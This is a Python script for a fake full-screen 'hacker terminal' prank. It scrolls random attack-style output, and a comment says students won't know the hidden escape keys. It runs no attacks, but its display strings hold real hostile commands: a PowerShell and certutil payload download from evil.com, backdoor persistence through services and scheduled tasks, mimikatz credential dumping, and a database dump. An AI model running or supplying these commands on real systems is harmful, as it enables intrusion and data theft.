#!/usr/bin/env python3
"""
Advanced System Access Terminal
Real-time network penetration and system infiltration toolkit
"""

import tkinter as tk
from tkinter import font
import random
import time
import threading
import string
import sys
import socket
import hashlib

class AdvancedTerminal:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("System Terminal")
        self.root.configure(bg='black')
        
        # Remove window decorations for authentic look
        self.root.overrideredirect(True)
        
        # Full screen
        self.root.attributes('-topmost', True)
        self.root.geometry(f"{self.root.winfo_screenwidth()}x{self.root.winfo_screenheight()}+0+0")
        
        # Hidden escape keys (students won't know)
        self.root.bind('<Escape>', self.quit_app)
        self.root.bind('<Control-c>', self.quit_app)
        
        self.setup_display()
        self.running = True
        self.animation_speed = 0.001  # Super fast typing
        self.start_animation()
    
    def setup_display(self):
        """Set up the main display area"""
        self.main_frame = tk.Frame(self.root, bg='black')
        self.main_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        self.create_header()
        self.create_terminal()
    
    def create_header(self):
        """Create the header with system info"""
        header_font = font.Font(family='Courier New', size=11, weight='bold')
        
        header_frame = tk.Frame(self.main_frame, bg='black')
        header_frame.pack(fill=tk.X, pady=(0, 10))
        
        # Get real system info for authenticity
        hostname = socket.gethostname()
        
        system_info = [
            f"NEURAL-NET BREACH PROTOCOL v4.7.2 | HOST: {hostname}",
            "STATUS: ACTIVE INFILTRATION | ENCRYPTION: QUANTUM-BYPASS | STEALTH: MAXIMUM",
            f"TARGET ACQUIRED: {random.choice(['MAINFRAME-7X', 'SECURE-DB-CLUSTER', 'FIREWALL-NEXUS'])} | ACCESS LEVEL: ROOT",
            "█" * 95
        ]
        
        for info in system_info:
            label = tk.Label(header_frame, text=info, font=header_font, 
                           fg='#00FF41', bg='black', anchor='w')
            label.pack(fill=tk.X)
    
    def create_terminal(self):
        """Create the main terminal display area"""
        self.terminal_font = font.Font(family='Courier New', size=9)
        
        terminal_frame = tk.Frame(self.main_frame, bg='black')
        terminal_frame.pack(fill=tk.BOTH, expand=True)
        
        self.terminal_text = tk.Text(terminal_frame, 
                                   font=self.terminal_font,
                                   bg='black', 
                                   fg='#00FF41',
                                   insertbackground='#00FF41',
                                   selectbackground='#003300',
                                   wrap=tk.NONE,
                                   state=tk.DISABLED,
                                   cursor="none")
        
        scrollbar = tk.Scrollbar(terminal_frame, command=self.terminal_text.yview,
                               bg='black', troughcolor='black', activebackground='#00FF41')
        self.terminal_text.configure(yscrollcommand=scrollbar.set)
        
        self.terminal_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
    
    def generate_password(self):
        """Generate realistic looking password"""
        passwords = ['admin123', 'password1', 'letmein', 'qwerty123', 'administrator', 
                    'welcome1', 'monkey123', 'dragon', 'master', 'shadow']
        return random.choice(passwords)
    
    def generate_wifi_key(self):
        """Generate realistic WiFi key"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(8,12)))
    
    def generate_hash(self):
        """Generate realistic hash"""
        return hashlib.md5(str(random.randint(1000000,9999999)).encode()).hexdigest()[:16]
    
    def generate_advanced_hack_line(self):
        """Generate realistic hacking command lines"""
        
        # Real-looking IP addresses
        target_ips = [
            f"{random.randint(192,223)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
            f"{random.randint(10,172)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        ]
        
        # Advanced hacking commands that look real
        advanced_templates = [
            f"nmap -sS -O -A {random.choice(target_ips)} -> {random.randint(15,87)} ports OPEN",
            f"sqlmap -u http://{random.choice(target_ips)}/login.php --dbs -> INJECTION SUCCESSFUL",
            f"hydra -l admin -P /usr/share/wordlists/rockyou.txt {random.choice(target_ips)} ssh -> PASSWORD CRACKED: {self.generate_password()}",
            f"meterpreter > sysinfo -> Windows {random.randint(7,11)} Enterprise BUILD {random.randint(10000,19999)}",
            f"john --wordlist=/opt/wordlists/passwords.txt hashes.txt -> CRACKED: {random.randint(1247,8934)} passwords",
            f"ettercap -T -M arp:remote /{random.choice(target_ips)}// -> ARP POISONING ACTIVE",
            f"aircrack-ng -w /usr/share/wordlists/rockyou.txt capture.cap -> WPA KEY: {self.generate_wifi_key()}",
            f"enum4linux {random.choice(target_ips)} -> DOMAIN: CORP\\Administrator ACTIVE",
            f"nikto -h http://{random.choice(target_ips)} -> {random.randint(12,47)} VULNERABILITIES FOUND",
            f"searchsploit windows {random.randint(7,11)} -> {random.randint(156,892)} EXPLOITS AVAILABLE",
            f"msfconsole > use exploit/windows/smb/ms17_010_eternalblue -> PAYLOAD READY",
            f"hashcat -m 1000 -a 0 ntlm.hash rockyou.txt -> HASH CRACKED: {self.generate_hash()}",
            f"gobuster dir -u http://{random.choice(target_ips)} -w common.txt -> /admin/ STATUS: 200",
            f"burpsuite -> INTERCEPTED REQUEST: POST /login -> CSRF TOKEN BYPASSED",
            f"wireshark -> CAPTURE: {random.randint(12847,98234)} PACKETS -> CREDENTIALS EXTRACTED",
            f"social-engineer toolkit -> CLONED SITE: paypal.com -> CREDENTIALS HARVESTED: {random.randint(12,89)}",
            f"volatility -f memory.dump imageinfo -> Windows {random.randint(7,11)} x64 DETECTED",
            f"binwalk firmware.bin -> EXTRACTED: {random.randint(47,189)} FILES",
            f"dirb http://{random.choice(target_ips)} -> FOUND: /backup/ /config/ /admin/",
            f"tcpdump -i eth0 host {random.choice(target_ips)} -> TRAFFIC CAPTURED: {random.randint(2847,9823)} BYTES",
            
            # System access commands
            f"net user administrator /active:yes -> USER ACCOUNT ACTIVATED",
            f"reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run -> PERSISTENCE ESTABLISHED",
            f"sc create backdoor binpath= C:\\Windows\\system32\\cmd.exe -> SERVICE CREATED",
            f"wmic process call create \"cmd.exe /c whoami\" -> NT AUTHORITY\\SYSTEM",
            f"powershell -exec bypass -nop -w hidden -c \"IEX((new-object net.webclient).downloadstring('http://evil.com/payload'))\"",
            f"mimikatz # sekurlsa::logonpasswords -> EXTRACTED: {random.randint(7,23)} CREDENTIALS",
            f"certutil -urlcache -split -f http://evil.com/payload.exe C:\\temp\\payload.exe -> DOWNLOAD COMPLETE",
            f"schtasks /create /tn backdoor /tr C:\\temp\\payload.exe /sc onstart -> TASK SCHEDULED",
            
            # Database breaches
            f"mysql -h {random.choice(target_ips)} -u root -p -> ACCESS GRANTED",
            f"SELECT * FROM users WHERE username='admin' -> {random.randint(1,3)} ROWS RETURNED",
            f"INSERT INTO users VALUES('hacker','password123',1) -> BACKDOOR USER CREATED",
            f"SHOW DATABASES -> customers, financial_data, user_accounts, transactions",
            f"mysqldump --all-databases > /tmp/stolen_data.sql -> DATABASE EXFILTRATED",
            
            # Network infiltration
            f"ping -c 1 {random.choice(target_ips)} -> TTL={random.randint(54,128)} ALIVE",
            f"traceroute {random.choice(target_ips)} -> {random.randint(8,15)} HOPS",
            f"arp-scan -l -> {random.randint(23,67)} DEVICES DISCOVERED",
            f"netdiscover -r 192.168.1.0/24 -> SCANNING SUBNET...",
            f"masscan -p1-65535 {random.choice(target_ips)} -> {random.randint(892,2847)} PORTS SCANNED",
        ]
        
        # Add random system responses
        if random.random() < 0.1:
            responses = [
                "[SUCCESS] Root access obtained",
                "[ALERT] Firewall bypassed", 
                "[INFO] Encryption keys extracted",
                "[WARNING] Intrusion detected - deploying countermeasures",
                "[CRITICAL] Database compromised",
                "[STATUS] Payload deployed successfully"
            ]
            return random.choice(responses)
        
        return random.choice(advanced_templates)
    
    def add_terminal_line(self, text, color='#00FF41'):
        """Add a line to the terminal display with typing effect"""
        self.terminal_text.config(state=tk.NORMAL)
        
        # Color coding for different types of output
        if 'SUCCESS' in text or 'CRACKED' in text or 'GRANTED' in text:
            color = '#00FF00'  # Bright green
        elif 'ALERT' in text or 'WARNING' in text or 'CRITICAL' in text:
            color = '#FF4444'  # Red
        elif 'FAILED' in text or 'DENIED' in text:
            color = '#FF8800'  # Orange
        elif '->' in text:
            color = '#00FFFF'  # Cyan
        
        self.terminal_text.insert(tk.END, text + '\n', 'normal')
        self.terminal_text.tag_config('normal', foreground=color)
        
        self.terminal_text.see(tk.END)
        
        # Limit text length
        lines = self.terminal_text.get('1.0', tk.END).count('\n')
        if lines > 500:
            self.terminal_text.delete('1.0', '50.0')
        
        self.terminal_text.config(state=tk.DISABLED)
    
    def animation_loop(self):
        """Main animation loop - superhuman speed"""
        while self.running:
            try:
                fake_line = self.generate_advanced_hack_line()
                self.add_terminal_line(fake_line)
                
                # Superhuman typing speed with occasional pauses for realism
                if random.random() < 0.05:  # 5% chance of brief pause
                    time.sleep(random.uniform(0.1, 0.3))
                else:
                    time.sleep(random.uniform(0.001, 0.01))  # Extremely fast
                
            except Exception:
                break
    
    def start_animation(self):
        """Start the animation in a separate thread"""
        # Add initial breach messages
        initial_messages = [
            "INITIALIZING NEURAL BREACH PROTOCOL...",
            "QUANTUM ENCRYPTION BYPASS... ACTIVE",
            "STEALTH MODE... ENGAGED", 
            "TARGET ACQUISITION... COMPLETE",
            "BEGINNING SYSTEMATIC INFILTRATION...",
            ""
        ]
        
        for msg in initial_messages:
            self.add_terminal_line(msg, '#FF4444')
            time.sleep(0.5)
        
        self.animation_thread = threading.Thread(target=self.animation_loop, daemon=True)
        self.animation_thread.start()
    
    def quit_app(self, event=None):
        """Quit the application"""
        self.running = False
        self.root.quit()
        self.root.destroy()
    
    def run(self):
        """Start the application"""
        try:
            self.root.mainloop()
        except KeyboardInterrupt:
            self.quit_app()

def main():
    """Main entry point"""
    try:
        app = AdvancedTerminal()
        app.run()
    except KeyboardInterrupt:
        pass

if __name__ == "__main__":
    main()